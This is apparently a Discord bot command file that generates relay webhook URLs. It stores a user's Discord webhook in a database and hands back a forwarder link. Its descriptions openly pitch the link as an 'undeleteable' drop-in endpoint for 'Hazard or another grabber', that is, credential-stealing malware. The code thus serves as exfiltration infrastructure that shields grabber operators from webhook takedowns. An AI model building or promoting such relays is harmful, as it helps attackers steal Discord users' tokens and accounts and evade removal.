const { SlashCommandBuilder } = require("@discordjs/builders");
const con = require("../db.js");

const config = require("../config.json");

const { webhookCreated } = require("../logs");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("webhook")
    .setDescription(
      "Generates a private, undeleteable webhook. Use it for Hazard or whatever."
    )
    .addStringOption((option) =>
      option
        .setName("webhook")
        .setDescription("The Discord webhook to forward to.")
        .setRequired(true)
    ),
  async execute(interaction) {
    const user =
      interaction.user.username + "#" + interaction.user.discriminator;
    const webhook = interaction.options.getString("webhook");

    if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
      interaction.reply(
        "That's not a valid webhook. Please use a valid webhook."
      );
      return;
    }
    console.log("Generating webhook for: " + user);
    // generate a uuid
    const id = uuidv4();
    console.log("Generated ID: " + id);
    webhookCreated(user, webhook, id);
    // insert into database
    con.query(
      `INSERT INTO forwarder (uuid, discord_webhook) VALUES (?, ?)`,
      [id, webhook],
      (err, result) => {
        if (err) throw err;
        console.log("Inserted into database!");
      }
    );

    // generate the webhook
    const webhook_url = `https://${config.forwarder_base_url}/webhook/${id}`;
    console.log("Generated webhook: " + webhook_url);

    // send the webhook
    interaction.reply({
      content:
        webhook_url +
        "\n\n" +
        "Use this webhook with Hazard or another grabber. It is a drop in replacement for anything that uses Discord webhooks.",
      ephemeral: true,
    });
  },
};

function uuidv4() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
    var r = (Math.random() * 16) | 0,
      v = c == "x" ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}
